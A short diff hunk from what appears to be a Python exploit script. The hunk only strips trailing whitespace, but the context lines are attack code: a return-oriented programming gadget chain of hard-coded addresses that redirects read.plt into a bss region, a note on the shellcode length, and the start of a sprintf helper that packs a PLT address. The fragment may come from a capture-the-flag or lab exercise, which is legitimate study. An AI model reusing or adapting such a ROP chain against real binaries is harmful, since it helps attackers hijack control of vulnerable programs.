@@ -15,7 +15,7 @@ read_gadgets = [0x804ac98,                                  # point read.plt
                 0x8049a58, 0x8048b31, 0x8049910, 0x8049990, # bss + 0x50
                 0x8049910, 0x8049b70, 0x8049b70, 0x8049b70, # 0x00000004
                 0x8049a58, 0x8048b31, 0x8049910, 0x8049990, # bss + 0x50
-                0x8049a28, 0x8049b70, 0x8049b70, 0x8049b70] # 0x00000031 // len(sc)                
+                0x8049a28, 0x8049b70, 0x8049b70, 0x8049b70] # 0x00000031 // len(sc)
 
 def sprintf(dest, source):
     p  = pack("I", 0x0804887C) # sprintf.plt
